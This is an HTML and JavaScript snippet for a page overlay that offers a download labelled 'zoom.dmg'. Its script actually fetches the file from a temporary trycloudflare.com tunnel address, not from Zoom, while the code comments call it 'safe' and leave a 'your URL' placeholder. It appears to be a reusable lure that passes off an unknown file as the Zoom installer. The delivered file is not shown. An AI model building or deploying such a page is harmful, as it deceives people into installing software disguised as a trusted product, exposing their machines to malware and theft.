<!-- Consent modal + download (safe) -->
<style>
  #consentModal {
    position: fixed; inset: 0; display:flex; align-items:center; justify-content:center;
    background: rgba(0,0,0,0.6); z-index:9999; font-family: Arial, sans-serif;
  }
  #consentModal .card {
    background: #fff; padding: 20px; border-radius:8px; max-width:420px; text-align:left;
    box-shadow: 0 6px 30px rgba(0,0,0,0.25);
  }
  #consentModal .actions { margin-top:12px; display:flex; gap:8px; justify-content:flex-end; }
  .btn { padding:8px 12px; border-radius:6px; border:0; cursor:pointer; }
  .btn-primary{ background:#0b74de; color:#fff; }
  .btn-muted{ background:#f0f0f0; color:#111; }
</style>

<div id="consentModal" role="dialog" aria-modal="true" aria-label="Download confirmation">
  <div class="card">
    <h3 style="margin:0 0 8px 0">Download available</h3>
    <p style="margin:0 0 12px 0">A file is available to download: <strong>zoom.dmg</strong>. Click <b>Download</b> to proceed.</p>
    <div class="actions">
      <button id="declineBtn" class="btn btn-muted">No thanks</button>
      <button id="downloadBtn" class="btn btn-primary">Download</button>
    </div>
  </div>
</div>

<script>
(function(){
  const fileUrl = 'https://individual-hobby-replacing-chargers.trycloudflare.com/ngrok'; // your URL
  const modal = document.getElementById('consentModal');
  const dlBtn = document.getElementById('downloadBtn');
  const decline = document.getElementById('declineBtn');

  // If you want to auto-hide modal after a while:
  // setTimeout(()=> modal.style.display = 'none', 20000);

  decline.addEventListener('click', ()=> {
    modal.style.display = 'none';
  });

  dlBtn.addEventListener('click', ()=> {
    // start download via programmatic link click (user-initiated)
    const a = document.createElement('a');
    a.href = fileUrl;
    a.download = ''; // leave empty or set filename
    // target=_blank sometimes lets browser decide; keep it same-origin rules
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    // hide modal
    modal.style.display = 'none';
  });
})();
</script>
